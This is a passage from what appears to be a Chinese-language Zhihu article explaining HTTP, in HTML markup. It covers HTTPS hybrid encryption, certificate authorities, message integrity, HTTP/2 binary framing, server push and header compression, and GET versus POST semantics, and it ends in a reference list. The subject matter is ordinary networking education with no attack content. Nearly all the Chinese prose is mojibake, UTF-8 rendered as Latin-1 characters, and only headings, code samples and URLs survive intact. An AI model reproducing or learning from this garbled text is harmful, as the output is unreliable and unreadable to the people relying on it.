ä¸ºç§æœ‰å¯†é’¥æ— æ³•è¢«å…¶ä»–äººè·å–ï¼Œå› æ­¤é€šä¿¡å‘é€æ–¹ä½¿ç”¨å…¶ç§æœ‰å¯†é’¥è¿›è¡Œç­¾åï¼Œé€šä¿¡æ¥æ”¶æ–¹ä½¿ç”¨å‘é€æ–¹çš„å…¬å¼€å¯†é’¥å¯¹ç­¾åè¿›è¡Œè§£å¯†ï¼Œå°±èƒ½åˆ¤æ–­è¿™ä¸ªç­¾åæ˜¯å¦æ­£ç¡®ã€‚</p><ul><li>ä¼˜ç‚¹ï¼šå¯ä»¥æ›´å®‰å…¨åœ°å°†å…¬å¼€å¯†é’¥ä¼ è¾“ç»™é€šä¿¡å‘é€æ–¹ï¼›</li><li>ç¼ºç‚¹ï¼šè¿ç®—é€Ÿåº¦æ…¢ã€‚</li></ul><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-a92eb07c039513da4b419d00e03ffca2_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"779\" data-rawheight=\"393\" class=\"origin_image zh-lightbox-thumb\" width=\"779\" data-original=\"https://pic3.zhimg.com/v2-a92eb07c039513da4b419d00e03ffca2_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;779&#39; height=&#39;393&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"779\" data-rawheight=\"393\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"779\" data-original=\"https://pic3.zhimg.com/v2-a92eb07c039513da4b419d00e03ffca2_r.jpg\" data-actualsrc=\"https://pic3.zhimg.com/v2-a92eb07c039513da4b419d00e03ffca2_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h3>3. HTTPS é‡‡ç”¨çš„åŠ å¯†æ–¹å¼</h3><p>HTTPS é‡‡ç”¨æ··åˆçš„åŠ å¯†æœºåˆ¶ï¼Œä½¿ç”¨éå¯¹ç§°å¯†é’¥åŠ å¯†ç”¨äºä¼ è¾“å¯¹ç§°å¯†é’¥æ¥ä¿è¯ä¼ è¾“è¿‡ç¨‹çš„å®‰å…¨æ€§ï¼Œä¹‹åä½¿ç”¨å¯¹ç§°å¯†é’¥åŠ å¯†è¿›è¡Œé€šä¿¡æ¥ä¿è¯é€šä¿¡è¿‡ç¨‹çš„æ•ˆç‡ã€‚ï¼ˆä¸‹å›¾ä¸­çš„ Session Key å°±æ˜¯å¯¹ç§°å¯†é’¥ï¼‰</p><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-fd1ff7363bf25f435f74d666472ebb50_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1572\" data-rawheight=\"4096\" class=\"origin_image zh-lightbox-thumb\" width=\"1572\" data-original=\"https://pic1.zhimg.com/v2-fd1ff7363bf25f435f74d666472ebb50_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;1572&#39; height=&#39;4096&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1572\" data-rawheight=\"4096\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"1572\" data-original=\"https://pic1.zhimg.com/v2-fd1ff7363bf25f435f74d666472ebb50_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-fd1ff7363bf25f435f74d666472ebb50_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>è®¤è¯</h2><p>é€šè¿‡ä½¿ç”¨  <b>è¯ä¹¦</b>  æ¥å¯¹é€šä¿¡æ–¹è¿›è¡Œè®¤è¯ã€‚</p><p>æ•°å­—è¯ä¹¦è®¤è¯æœºæ„ï¼ˆCAï¼ŒCertificate Authorityï¼‰æ˜¯å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨åŒæ–¹éƒ½å¯ä¿¡èµ–çš„ç¬¬ä¸‰æ–¹æœºæ„ã€‚</p><p>æœåŠ¡å™¨çš„è¿è¥äººå‘˜å‘ CA æå‡ºå…¬å¼€å¯†é’¥çš„ç”³è¯·ï¼ŒCA åœ¨åˆ¤æ˜æå‡ºç”³è¯·è€…çš„èº«ä»½ä¹‹åï¼Œä¼šå¯¹å·²ç”³è¯·çš„å…¬å¼€å¯†é’¥åšæ•°å­—ç­¾åï¼Œç„¶ååˆ†é…è¿™ä¸ªå·²ç­¾åçš„å…¬å¼€å¯†é’¥ï¼Œå¹¶å°†è¯¥å…¬å¼€å¯†é’¥æ”¾å…¥å…¬å¼€å¯†é’¥è¯ä¹¦åç»‘å®šåœ¨ä¸€èµ·ã€‚</p><p>è¿›è¡Œ HTTPS é€šä¿¡æ—¶ï¼ŒæœåŠ¡å™¨ä¼šæŠŠè¯ä¹¦å‘é€ç»™å®¢æˆ·ç«¯ã€‚å®¢æˆ·ç«¯å–å¾—å…¶ä¸­çš„å…¬å¼€å¯†é’¥ä¹‹åï¼Œå…ˆä½¿ç”¨æ•°å­—ç­¾åè¿›è¡ŒéªŒè¯ï¼Œå¦‚æœéªŒè¯é€šè¿‡ï¼Œå°±å¯ä»¥å¼€å§‹é€šä¿¡äº†ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-f124262d5d7ac2d6e2b643eba64b2290_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"595\" class=\"origin_image zh-lightbox-thumb\" width=\"800\" data-original=\"https://pic1.zhimg.com/v2-f124262d5d7ac2d6e2b643eba64b2290_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;800&#39; height=&#39;595&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"595\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"800\" data-original=\"https://pic1.zhimg.com/v2-f124262d5d7ac2d6e2b643eba64b2290_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-f124262d5d7ac2d6e2b643eba64b2290_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>å®Œæ•´æ€§ä¿æŠ¤</h2><p>SSL æä¾›æŠ¥æ–‡æ‘˜è¦åŠŸèƒ½æ¥è¿›è¡Œå®Œæ•´æ€§ä¿æŠ¤ã€‚</p><p>HTTP ä¹Ÿæä¾›äº† MD5 æŠ¥æ–‡æ‘˜è¦åŠŸèƒ½ï¼Œä½†ä¸æ˜¯å®‰å…¨çš„ã€‚ä¾‹å¦‚æŠ¥æ–‡å†…å®¹è¢«ç¯¡æ”¹ä¹‹åï¼ŒåŒæ—¶é‡æ–°è®¡ç®— MD5 çš„å€¼ï¼Œé€šä¿¡æ¥æ”¶æ–¹æ˜¯æ— æ³•æ„è¯†åˆ°å‘ç”Ÿäº†ç¯¡æ”¹ã€‚</p><p>HTTPS çš„æŠ¥æ–‡æ‘˜è¦åŠŸèƒ½ä¹‹æ‰€ä»¥å®‰å…¨ï¼Œæ˜¯å› ä¸ºå®ƒç»“åˆäº†åŠ å¯†å’Œè®¤è¯è¿™ä¸¤ä¸ªæ“ä½œã€‚è¯•æƒ³ä¸€ä¸‹ï¼ŒåŠ å¯†ä¹‹åçš„æŠ¥æ–‡ï¼Œé­åˆ°ç¯¡æ”¹ä¹‹åï¼Œä¹Ÿå¾ˆéš¾é‡æ–°è®¡ç®—æŠ¥æ–‡æ‘˜è¦ï¼Œå› ä¸ºæ— æ³•è½»æ˜“è·å–æ˜æ–‡ã€‚</p><h2>HTTPS çš„ç¼ºç‚¹</h2><ul><li>å› ä¸ºéœ€è¦è¿›è¡ŒåŠ å¯†è§£å¯†ç­‰è¿‡ç¨‹ï¼Œå› æ­¤é€Ÿåº¦ä¼šæ›´æ…¢ï¼›</li><li>éœ€è¦æ”¯ä»˜è¯ä¹¦æˆæƒçš„é«˜é¢è´¹ç”¨ã€‚</li></ul><h2>ä¸ƒã€HTTP/2.0</h2><h2>HTTP/1.x ç¼ºé™·</h2><p>HTTP/1.x å®ç°ç®€å•æ˜¯ä»¥ç‰ºç‰²æ€§èƒ½ä¸ºä»£ä»·çš„ï¼š</p><ul><li>å®¢æˆ·ç«¯éœ€è¦ä½¿ç”¨å¤šä¸ªè¿æ¥æ‰èƒ½å®ç°å¹¶å‘å’Œç¼©çŸ­å»¶è¿Ÿï¼›</li><li>ä¸ä¼šå‹ç¼©è¯·æ±‚å’Œå“åº”é¦–éƒ¨ï¼Œä»è€Œå¯¼è‡´ä¸å¿…è¦çš„ç½‘ç»œæµé‡ï¼›</li><li>ä¸æ”¯æŒæœ‰æ•ˆçš„èµ„æºä¼˜å…ˆçº§ï¼Œè‡´ä½¿åº•å±‚ TCP è¿æ¥çš„åˆ©ç”¨ç‡ä½ä¸‹ã€‚</li></ul><h2>äºŒè¿›åˆ¶åˆ†å¸§å±‚</h2><p>HTTP/2.0 å°†æŠ¥æ–‡åˆ†æˆ HEADERS å¸§å’Œ DATA å¸§ï¼Œå®ƒä»¬éƒ½æ˜¯äºŒè¿›åˆ¶æ ¼å¼çš„ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-a27bcbc580278f388ace0fb3d245d2d5_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"557\" data-rawheight=\"438\" class=\"origin_image zh-lightbox-thumb\" width=\"557\" data-original=\"https://pic2.zhimg.com/v2-a27bcbc580278f388ace0fb3d245d2d5_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;557&#39; height=&#39;438&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"557\" data-rawheight=\"438\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"557\" data-original=\"https://pic2.zhimg.com/v2-a27bcbc580278f388ace0fb3d245d2d5_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-a27bcbc580278f388ace0fb3d245d2d5_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>åœ¨é€šä¿¡è¿‡ç¨‹ä¸­ï¼Œåªä¼šæœ‰ä¸€ä¸ª TCP è¿æ¥å­˜åœ¨ï¼Œå®ƒæ‰¿è½½äº†ä»»æ„æ•°é‡çš„åŒå‘æ•°æ®æµï¼ˆStreamï¼‰ã€‚</p><ul><li>ä¸€ä¸ªæ•°æ®æµï¼ˆStreamï¼‰éƒ½æœ‰ä¸€ä¸ªå”¯ä¸€æ ‡è¯†ç¬¦å’Œå¯é€‰çš„ä¼˜å…ˆçº§ä¿¡æ¯ï¼Œç”¨äºæ‰¿è½½åŒå‘ä¿¡æ¯ã€‚</li><li>æ¶ˆæ¯ï¼ˆMessageï¼‰æ˜¯ä¸é€»è¾‘è¯·æ±‚æˆ–å“åº”å¯¹åº”çš„å®Œæ•´çš„ä¸€ç³»åˆ—å¸§ã€‚</li><li>å¸§ï¼ˆFrameï¼‰æ˜¯æœ€å°çš„é€šä¿¡å•ä½ï¼Œæ¥è‡ªä¸åŒæ•°æ®æµçš„å¸§å¯ä»¥äº¤é”™å‘é€ï¼Œç„¶åå†æ ¹æ®æ¯ä¸ªå¸§å¤´çš„æ•°æ®æµæ ‡è¯†ç¬¦é‡æ–°ç»„è£…ã€‚</li></ul><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-b6d41f91cd72ccd8ef2a6683226ff9b9_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"936\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"936\" data-original=\"https://pic2.zhimg.com/v2-b6d41f91cd72ccd8ef2a6683226ff9b9_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;936&#39; height=&#39;720&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"936\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"936\" data-original=\"https://pic2.zhimg.com/v2-b6d41f91cd72ccd8ef2a6683226ff9b9_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-b6d41f91cd72ccd8ef2a6683226ff9b9_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>æœåŠ¡ç«¯æ¨é€</h2><p>HTTP/2.0 åœ¨å®¢æˆ·ç«¯è¯·æ±‚ä¸€ä¸ªèµ„æºæ—¶ï¼Œä¼šæŠŠç›¸å…³çš„èµ„æºä¸€èµ·å‘é€ç»™å®¢æˆ·ç«¯ï¼Œå®¢æˆ·ç«¯å°±ä¸éœ€è¦å†æ¬¡å‘èµ·è¯·æ±‚äº†ã€‚ä¾‹å¦‚å®¢æˆ·ç«¯è¯·æ±‚ page.html é¡µé¢ï¼ŒæœåŠ¡ç«¯å°±æŠŠ script.js å’Œ style.css ç­‰ä¸ä¹‹ç›¸å…³çš„èµ„æºä¸€èµ·å‘ç»™å®¢æˆ·ç«¯ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-0eb94ec6fce5d89a32d3e8940ebdeb2b_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"853\" data-rawheight=\"341\" class=\"origin_image zh-lightbox-thumb\" width=\"853\" data-original=\"https://pic4.zhimg.com/v2-0eb94ec6fce5d89a32d3e8940ebdeb2b_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;853&#39; height=&#39;341&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"853\" data-rawheight=\"341\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"853\" data-original=\"https://pic4.zhimg.com/v2-0eb94ec6fce5d89a32d3e8940ebdeb2b_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-0eb94ec6fce5d89a32d3e8940ebdeb2b_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>é¦–éƒ¨å‹ç¼©</h2><p>HTTP/1.1 çš„é¦–éƒ¨å¸¦æœ‰å¤§é‡ä¿¡æ¯ï¼Œè€Œä¸”æ¯æ¬¡éƒ½è¦é‡å¤å‘é€ã€‚</p><p>HTTP/2.0 è¦æ±‚å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨åŒæ—¶ç»´æŠ¤å’Œæ›´æ–°ä¸€ä¸ªåŒ…å«ä¹‹å‰è§è¿‡çš„é¦–éƒ¨å­—æ®µè¡¨ï¼Œä»è€Œé¿å…äº†é‡å¤ä¼ è¾“ã€‚</p><p>ä¸ä»…å¦‚æ­¤ï¼ŒHTTP/2.0 ä¹Ÿä½¿ç”¨ Huffman ç¼–ç å¯¹é¦–éƒ¨å­—æ®µè¿›è¡Œå‹ç¼©ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-6e72489d133e7997c94d60f1bdde1890_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"873\" data-rawheight=\"722\" class=\"origin_image zh-lightbox-thumb\" width=\"873\" data-original=\"https://pic1.zhimg.com/v2-6e72489d133e7997c94d60f1bdde1890_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;873&#39; height=&#39;722&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"873\" data-rawheight=\"722\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"873\" data-original=\"https://pic1.zhimg.com/v2-6e72489d133e7997c94d60f1bdde1890_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-6e72489d133e7997c94d60f1bdde1890_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>å…«ã€HTTP/1.1 æ–°ç‰¹æ€§</h2><p>è¯¦ç»†å†…å®¹è¯·è§ä¸Šæ–‡</p><ul><li>é»˜è®¤æ˜¯é•¿è¿æ¥</li><li>æ”¯æŒæµæ°´çº¿</li><li>æ”¯æŒåŒæ—¶æ‰“å¼€å¤šä¸ª TCP è¿æ¥</li><li>æ”¯æŒè™šæ‹Ÿä¸»æœº</li><li>æ–°å¢çŠ¶æ€ç  100</li><li>æ”¯æŒåˆ†å—ä¼ è¾“ç¼–ç </li><li>æ–°å¢ç¼“å­˜å¤„ç†æŒ‡ä»¤ max-age</li></ul><h2>ä¹ã€GET å’Œ POST æ¯”è¾ƒ</h2><h2>ä½œç”¨</h2><p>GET ç”¨äºè·å–èµ„æºï¼Œè€Œ POST ç”¨äºä¼ è¾“å®ä½“ä¸»ä½“ã€‚</p><h2>å‚æ•°</h2><p>GET å’Œ POST çš„è¯·æ±‚éƒ½èƒ½ä½¿ç”¨é¢å¤–çš„å‚æ•°ï¼Œä½†æ˜¯ GET çš„å‚æ•°æ˜¯ä»¥æŸ¥è¯¢å­—ç¬¦ä¸²å‡ºç°åœ¨ URL ä¸­ï¼Œè€Œ POST çš„å‚æ•°å­˜å‚¨åœ¨å®ä½“ä¸»ä½“ä¸­ã€‚ä¸èƒ½å› ä¸º POST å‚æ•°å­˜å‚¨åœ¨å®ä½“ä¸»ä½“ä¸­å°±è®¤ä¸ºå®ƒçš„å®‰å…¨æ€§æ›´é«˜ï¼Œå› ä¸ºç…§æ ·å¯ä»¥é€šè¿‡ä¸€äº›æŠ“åŒ…å·¥å…·ï¼ˆFiddlerï¼‰æŸ¥çœ‹ã€‚</p><p>å› ä¸º URL åªæ”¯æŒ ASCII ç ï¼Œå› æ­¤ GET çš„å‚æ•°ä¸­å¦‚æœå­˜åœ¨ä¸­æ–‡ç­‰å­—ç¬¦å°±éœ€è¦å…ˆè¿›è¡Œç¼–ç ã€‚ä¾‹å¦‚ <code>ä¸­æ–‡</code> ä¼šè½¬æ¢ä¸º <code>%E4%B8%AD%E6%96%87</code>ï¼Œè€Œç©ºæ ¼ä¼šè½¬æ¢ä¸º <code>%20</code>ã€‚POST å‚æ•°æ”¯æŒæ ‡å‡†å­—ç¬¦é›†ã€‚</p><div class=\"highlight\"><pre><code class=\"language-text\">GET /test/demo_form.asp?name1=value1&amp;name2=value2 HTTP/1.1\nPOST /test/demo_form.asp HTTP/1.1\nHost: w3schools.com\nname1=value1&amp;name2=value2</code></pre></div><h2>å®‰å…¨</h2><p>å®‰å…¨çš„ HTTP æ–¹æ³•ä¸ä¼šæ”¹å˜æœåŠ¡å™¨çŠ¶æ€ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒåªæ˜¯å¯è¯»çš„ã€‚</p><p>GET æ–¹æ³•æ˜¯å®‰å…¨çš„ï¼Œè€Œ POST å´ä¸æ˜¯ï¼Œå› ä¸º POST çš„ç›®çš„æ˜¯ä¼ é€å®ä½“ä¸»ä½“å†…å®¹ï¼Œè¿™ä¸ªå†…å®¹å¯èƒ½æ˜¯ç”¨æˆ·ä¸Šä¼ çš„è¡¨å•æ•°æ®ï¼Œä¸Šä¼ æˆåŠŸä¹‹åï¼ŒæœåŠ¡å™¨å¯èƒ½æŠŠè¿™ä¸ªæ•°æ®å­˜å‚¨åˆ°æ•°æ®åº“ä¸­ï¼Œå› æ­¤çŠ¶æ€ä¹Ÿå°±å‘ç”Ÿäº†æ”¹å˜ã€‚</p><p>å®‰å…¨çš„æ–¹æ³•é™¤äº† GET ä¹‹å¤–è¿˜æœ‰ï¼šHEADã€OPTIONSã€‚</p><p>ä¸å®‰å…¨çš„æ–¹æ³•é™¤äº† POST ä¹‹å¤–è¿˜æœ‰ PUTã€DELETEã€‚</p><h2>å¹‚ç­‰æ€§</h2><p>å¹‚ç­‰çš„ HTTP æ–¹æ³•ï¼ŒåŒæ ·çš„è¯·æ±‚è¢«æ‰§è¡Œä¸€æ¬¡ä¸è¿ç»­æ‰§è¡Œå¤šæ¬¡çš„æ•ˆæœæ˜¯ä¸€æ ·çš„ï¼ŒæœåŠ¡å™¨çš„çŠ¶æ€ä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚æ¢å¥è¯è¯´å°±æ˜¯ï¼Œå¹‚ç­‰æ–¹æ³•ä¸åº”è¯¥å…·æœ‰å‰¯ä½œç”¨ï¼ˆç»Ÿè®¡ç”¨é€”é™¤å¤–ï¼‰ã€‚</p><p>æ‰€æœ‰çš„å®‰å…¨æ–¹æ³•ä¹Ÿéƒ½æ˜¯å¹‚ç­‰çš„ã€‚</p><p>åœ¨æ­£ç¡®å®ç°çš„æ¡ä»¶ä¸‹ï¼ŒGETï¼ŒHEADï¼ŒPUT å’Œ DELETE ç­‰æ–¹æ³•éƒ½æ˜¯å¹‚ç­‰çš„ï¼Œè€Œ POST æ–¹æ³•ä¸æ˜¯ã€‚</p><p>GET /pageX HTTP/1.1 æ˜¯å¹‚ç­‰çš„ï¼Œè¿ç»­è°ƒç”¨å¤šæ¬¡ï¼Œå®¢æˆ·ç«¯æ¥æ”¶åˆ°çš„ç»“æœéƒ½æ˜¯ä¸€æ ·çš„ï¼š</p><div class=\"highlight\"><pre><code class=\"language-text\">GET /pageX HTTP/1.1\nGET /pageX HTTP/1.1\nGET /pageX HTTP/1.1\nGET /pageX HTTP/1.1</code></pre></div><p>POST /add_row HTTP/1.1 ä¸æ˜¯å¹‚ç­‰çš„ï¼Œå¦‚æœè°ƒç”¨å¤šæ¬¡ï¼Œå°±ä¼šå¢åŠ å¤šè¡Œè®°å½•ï¼š</p><div class=\"highlight\"><pre><code class=\"language-text\">POST /add_row HTTP/1.1   -&gt; Adds a 1nd row\nPOST /add_row HTTP/1.1   -&gt; Adds a 2nd row\nPOST /add_row HTTP/1.1   -&gt; Adds a 3rd row</code></pre></div><p>DELETE /idX/delete HTTP/1.1 æ˜¯å¹‚ç­‰çš„ï¼Œå³ä½¿ä¸åŒçš„è¯·æ±‚æ¥æ”¶åˆ°çš„çŠ¶æ€ç ä¸ä¸€æ ·ï¼š</p><div class=\"highlight\"><pre><code class=\"language-text\">DELETE /idX/delete HTTP/1.1   -&gt; Returns 200 if idX exists\nDELETE /idX/delete HTTP/1.1   -&gt; Returns 404 as it just got deleted\nDELETE /idX/delete HTTP/1.1   -&gt; Returns 404</code></pre></div><h2>å¯ç¼“å­˜</h2><p>å¦‚æœè¦å¯¹å“åº”è¿›è¡Œç¼“å­˜ï¼Œéœ€è¦æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š</p><ul><li>è¯·æ±‚æŠ¥æ–‡çš„ HTTP æ–¹æ³•æœ¬èº«æ˜¯å¯ç¼“å­˜çš„ï¼ŒåŒ…æ‹¬ GET å’Œ HEADï¼Œä½†æ˜¯ PUT å’Œ DELETE ä¸å¯ç¼“å­˜ï¼ŒPOST åœ¨å¤šæ•°æƒ…å†µä¸‹ä¸å¯ç¼“å­˜çš„ã€‚</li><li>å“åº”æŠ¥æ–‡çš„çŠ¶æ€ç æ˜¯å¯ç¼“å­˜çš„ï¼ŒåŒ…æ‹¬ï¼š200, 203, 204, 206, 300, 301, 404, 405, 410, 414, and 501ã€‚</li><li>å“åº”æŠ¥æ–‡çš„ Cache-Control é¦–éƒ¨å­—æ®µæ²¡æœ‰æŒ‡å®šä¸è¿›è¡Œç¼“å­˜ã€‚</li></ul><h2>XMLHttpRequest</h2><p>ä¸ºäº†é˜è¿° POST å’Œ GET çš„å¦ä¸€ä¸ªåŒºåˆ«ï¼Œéœ€è¦å…ˆäº†è§£ XMLHttpRequestï¼š</p><blockquote> XMLHttpRequest æ˜¯ä¸€ä¸ª APIï¼Œå®ƒä¸ºå®¢æˆ·ç«¯æä¾›äº†åœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´ä¼ è¾“æ•°æ®çš„åŠŸèƒ½ã€‚å®ƒæä¾›äº†ä¸€ä¸ªé€šè¿‡ URL æ¥è·å–æ•°æ®çš„ç®€å•æ–¹å¼ï¼Œå¹¶ä¸”ä¸ä¼šä½¿æ•´ä¸ªé¡µé¢åˆ·æ–°ã€‚è¿™ä½¿å¾—ç½‘é¡µåªæ›´æ–°ä¸€éƒ¨åˆ†é¡µé¢è€Œä¸ä¼šæ‰“æ‰°åˆ°ç”¨æˆ·ã€‚XMLHttpRequest åœ¨ AJAX ä¸­è¢«å¤§é‡ä½¿ç”¨ã€‚<br/> </blockquote><ul><li>åœ¨ä½¿ç”¨ XMLHttpRequest çš„ POST æ–¹æ³•æ—¶ï¼Œæµè§ˆå™¨ä¼šå…ˆå‘é€ Header å†å‘é€ Dataã€‚ä½†å¹¶ä¸æ˜¯æ‰€æœ‰æµè§ˆå™¨ä¼šè¿™ä¹ˆåšï¼Œä¾‹å¦‚ç«ç‹å°±ä¸ä¼šã€‚</li><li>è€Œ GET æ–¹æ³• Header å’Œ Data ä¼šä¸€èµ·å‘é€ã€‚</li></ul><h2>å‚è€ƒèµ„æ–™</h2><ul><li>ä¸Šé‡å®£. å›¾è§£ HTTP[M]. äººæ°‘é‚®ç”µå‡ºç‰ˆç¤¾, 2014.</li><li><a href=\"https://link.zhihu.com/?target=https%3A//developer.mozilla.org/en-US/docs/Web/HTTP\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">MDN : HTTP</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//developers.google.com/web/fundamentals/performance/http2/%3Fhl%3Dzh-cn\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">HTTP/2 ç®€ä»‹</a></li><li><a href=\"https://link.zhihu.com/?target=http%3A//php.net/manual/zh/function.htmlspecialchars.php\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">htmlspecialchars</a></li><li><a href=\"https://link.zhihu.com/?target=http%3A//java2db.com/java-io/how-to-get-and-the-difference-between-file-uri-and-url-in-java\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Difference between file URI and URL in java</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//software-security.sans.org/developer-how-to/fix-sql-injection-in-java-using-prepared-callable-statement\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">How to Fix SQL Injection Using Java PreparedStatement &amp; CallableStatement</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//www.cnblogs.com/hyddd/archive/2009/03/31/1426026.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">æµ…è°ˆ HTTP ä¸­ Get ä¸ Post çš„åŒºåˆ«</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//www.webdancers.com/are-http-and-www-necesary/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Are http:// and www really necessary?</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//www.ntu.edu.sg/home/ehchua/programming/webprogramming/HTTP_Basics.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">HTTP (HyperText Transfer Protocol)</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//www.igvita.com/2011/12/01/web-vpn-secure-proxies-with-spdy-chrome/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Web-VPN: Secure Proxies with SPDY &amp; Chrome</a></li><li><a href=\"https://link.zhihu.com/?target=http%3A//en.wikipedia.org/wiki/File%3AHTTP_persistent_connection.svg\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">File:HTTP persistent connection.svg</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//en.wikipedia.org/wiki/Proxy_server\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Proxy server</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//www.x-cart.com/blog/what-is-https-and-ssl.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">What Is This HTTPS/SSL Thing And Why Should You Care?</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//securebox.comodo.com/ssl-sniffing/ssl-offloading/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">What is SSL Offloading?</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//docs.oracle.com/cd/E19424-01/820-4811/6ng8i26bn/index.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Sun Directory Server Enterprise Edition 7.0 Reference - Key Encryption</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//www.codeproject.com/Articles/326574/An-Introduction-to-Mutual-SSL-Authentication\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">An Introduction to Mutual SSL Authentication</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//danielmiessler.com/study/url-uri/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">The Difference Between URLs and URIs</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//juejin.im/entry/5766c29d6be3ff006a31b84e%23comment\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Cookie ä¸ Session çš„åŒºåˆ«</a></li><li><a href=\"https://www.zhihu.com/question/19786827\" class=\"internal\">COOKIE å’Œ SESSION æœ‰ä»€ä¹ˆåŒºåˆ«</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//harttle.land/2015/08/10/cookie-session.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Cookie/Session çš„æœºåˆ¶ä¸å®‰å…¨</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//shijianan.com/2017/06/11/https/\" class=\" wrap external\" 